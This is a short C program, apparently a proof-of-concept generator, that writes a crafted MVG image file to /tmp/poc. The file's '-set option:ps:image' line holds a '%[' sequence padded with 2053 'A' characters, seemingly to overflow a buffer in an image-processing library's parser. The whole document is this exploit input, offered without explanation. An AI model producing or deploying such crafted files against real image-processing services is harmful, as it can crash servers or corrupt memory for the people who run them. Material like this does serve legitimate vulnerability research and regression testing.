#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    fprintf(f, "viewbox 0 0 100 100\n");
    fprintf(f, "push graphic-context\n");
    fprintf(f, "-set option:ps:image ");
    fputc('%', f);
    fputc('[', f);
    for (int i = 0; i < 2053; i++) fputc('A', f);
    fputc(']', f);
    fputc('\n', f);
    fprintf(f, "pop graphic-context\n");

    fclose(f);
    return 0;
}